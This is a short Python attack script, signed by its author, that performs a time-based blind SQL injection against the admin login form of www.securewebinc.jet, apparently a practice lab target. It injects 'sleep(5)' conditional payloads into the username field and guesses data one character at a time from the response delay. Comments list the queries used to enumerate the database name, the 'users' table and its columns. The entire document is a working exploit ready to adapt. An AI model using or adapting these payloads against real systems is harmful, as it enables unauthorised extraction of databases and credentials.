#!/usr/bin/env python3
# xeniel was here

import requests, time

charset = "abcdefghijklmnopqrstuvwxyz0123456789!@#$^&*().-=+{}"
result = ''

url = "http://www.securewebinc.jet:80/dirb_safe_dir_rf9EmcEIx/admin/dologin.php"
cookies = {"PHPSESSID": "k77sq6l7qamc2ua0agkfiuhrs7"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://www.securewebinc.jet", "DNT": "1", "Connection": "close", "Referer": "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php", "Sec-GPC": "1"}
username = "admin"

for i in range(1,100):
    for c in charset:

        # ' and if(substr(database(),n,1)='c',sleep(5),1)-- -
        # jetadmin

        # "' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{},1)='{}',sleep(5),1)-- -".format(i,c)
        # users

        # "' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 0,1),{},1)='{}',sleep(5),1)-- -".format(i,c)
        # id

        # "' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 1,1),{},1)='{}',sleep(5),1)-- -".format(i,c)
        # username

        # "' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 2,1),{},1)='{}',sleep(5),1)-- -".format(i,c)
        # password

        payload = "' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 2,1),{},1)='{}',sleep(5),1)-- -".format(i,c)
        data = {"username": username + payload, "password": "admin"}
        start = time.time()
        res = requests.post(url, headers=headers, cookies=cookies, data=data)
        roundtrip = time.time() - start

        if roundtrip >= 5:
            result += c 
            print(result)
            break;

print("[+] FOUND: " + result)
